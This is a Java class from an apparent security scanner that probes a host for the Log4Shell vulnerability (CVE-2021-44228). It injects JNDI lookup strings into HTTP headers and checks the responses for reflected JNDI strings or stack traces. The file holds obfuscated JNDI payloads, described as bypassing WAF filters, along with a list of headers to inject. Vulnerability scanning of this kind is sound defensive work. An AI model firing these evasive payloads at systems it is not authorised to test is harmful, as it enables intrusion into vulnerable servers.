package it.r2u.anibus.service.analysis;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;

/**
 * Log4Shell Checker — CVE-2021-44228
 *
 * Injects JNDI-based payloads into common HTTP headers (User-Agent,
 * X-Forwarded-For, Referer, etc.) and detects:
 * - JNDI / NamingException strings reflected back in error responses
 * - Java stack traces appearing after injection that did not exist before
 *
 * NOTE: Definitive out-of-band detection requires a callback server such as
 * interactsh. This checker covers in-band observable indicators only.
 */
public class Log4ShellChecker {

    public record Log4ShellFinding(
        String url,
        String header,
        String payload,
        String indicator,
        String riskNote
    ) {}

    // Standard obfuscated JNDI payloads that bypass naive WAF filters
    private static final String[] PAYLOADS = {
        "${jndi:ldap://127.0.0.1:1389/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}",
        "${${lower:j}ndi:${lower:l}dap://127.0.0.1:1389/a}",
        "${jndi:dns://127.0.0.1:5353/a}",
        "${j${::-n}di:ldap://127.0.0.1:1389/a}"
    };

    // Headers commonly processed and logged by Java web frameworks
    private static final String[] HEADERS = {
        "User-Agent", "X-Forwarded-For", "X-Api-Version",
        "Referer", "X-Forwarded-Host", "Accept-Language",
        "X-Originating-IP", "CF-Connecting_IP"
    };

    // Strings in a response body that indicate the JNDI payload was logged/reflected
    private static final String[] JNDI_INDICATORS = {
        "JNDI", "jndi", "ldap://", "rmi://", "NamingException",
        "CommunicationsException", "InitialContext", "LdapCtx"
    };

    // Java stack trace tokens that signal a Java backend reacted to the payload
    private static final String[] JAVA_STACK_INDICATORS = {
        "java.lang.", "javax.", "org.springframework", "log4j",
        "NullPointerException", "ClassNotFoundException", "weblogic", "jboss"
    };

    private final int timeoutMs;

    public Log4ShellChecker(int timeoutMs) {
        this.timeoutMs = timeoutMs;
    }

    public Log4ShellChecker() {
        this(6000);
    }

    public List<Log4ShellFinding> scan(String host, int port) {
        List<Log4ShellFinding> findings = new ArrayList<>();

        String[] schemes = (port == 443) ? new String[]{"https"}
                         : (port == 80)  ? new String[]{"http"}
                         : new String[]{"http", "https"};

        for (String scheme : schemes) {
            String baseUrl = scheme + "://" + host
                + (isDefaultPort(scheme, port) ? "" : ":" + port) + "/";

            int baseline = getResponseCode(baseUrl);
            if (baseline < 0) continue;

            outer:
            for (String header : HEADERS) {
                for (String payload : PAYLOADS) {
                    Log4ShellFinding f = probe(baseUrl, header, payload, baseline);
                    if (f != null) {
                        findings.add(f);
                        break outer; // one confirmed finding per target is sufficient
                    }
                }
            }
            if (!findings.isEmpty()) break;
        }
        return findings;
    }

    private Log4ShellFinding probe(String url, String header, String payload, int baseline) {
        try {
            HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);
            conn.setRequestMethod("GET");
            conn.setRequestProperty(header, payload);
            conn.setRequestProperty("Accept", "*/*");

            int code = conn.getResponseCode();
            String body = readBody(conn, code);

            // Check if the JNDI payload string was reflected / logged back
            for (String ind : JNDI_INDICATORS) {
                if (body.contains(ind)) {
                    return new Log4ShellFinding(url, header, payload, ind,
                        "Server reflected JNDI artifact in response — likely vulnerable Log4j");
                }
            }

            // Check for new Java stack traces that appear only after injection
            if (code >= 500 && baseline < 500) {
                for (String ind : JAVA_STACK_INDICATORS) {
                    if (body.contains(ind)) {
                        return new Log4ShellFinding(url, header, payload, ind,
                            "Java stack trace appeared after JNDI injection (HTTP "
                            + code + " vs baseline " + baseline + ")");
                    }
                }
            }
        } catch (IOException | IllegalArgumentException ignored) {
        }
        return null;
    }

    private int getResponseCode(String url) {
        try {
            HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            return conn.getResponseCode();
        } catch (IOException | IllegalArgumentException e) {
            return -1;
        }
    }

    private String readBody(HttpURLConnection conn, int code) {
        try {
            InputStream is = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
            if (is == null) return "";
            byte[] bytes = is.readAllBytes();
            String body = new String(bytes);
            return body.length() > 3000 ? body.substring(0, 3000) : body;
        } catch (IOException ignored) {
            return "";
        }
    }

    private boolean isDefaultPort(String scheme, int port) {
        return ("http".equals(scheme) && port == 80)
            || ("https".equals(scheme) && port == 443);
    }

    public static String formatReport(List<Log4ShellFinding> findings, String target) {
        StringBuilder sb = new StringBuilder();
        sb.append("═══════════════════════════════════════════════════════════\n");
        sb.append("    LOG4SHELL CHECK (CVE-2021-44228) — ").append(target).append("\n");
        sb.append("═══════════════════════════════════════════════════════════\n\n");

        if (findings.isEmpty()) {
            sb.append("  ✓ No in-band Log4Shell indicators detected.\n");
            sb.append("  Note: For definitive OOB detection use interactsh or similar\n");
            sb.append("        callback infrastructure.\n");
        } else {
            sb.append(String.format(
                "  ⚠ POSSIBLE Log4Shell vulnerability — %d indicator(s):\n\n",
                findings.size()));
            for (Log4ShellFinding f : findings) {
                sb.append(String.format("  Header    : %s\n", f.header()));
                sb.append(String.format("  Payload   : %s\n", f.payload()));
                sb.append(String.format("  Indicator : %s\n", f.indicator()));
                sb.append(String.format("  Note      : %s\n\n", f.riskNote()));
            }
            sb.append("  CVE  : CVE-2021-44228\n");
            sb.append("  PoC  : https://www.exploit-db.com/search?cve=CVE-2021-44228\n");
        }
        return sb.toString();
    }
}
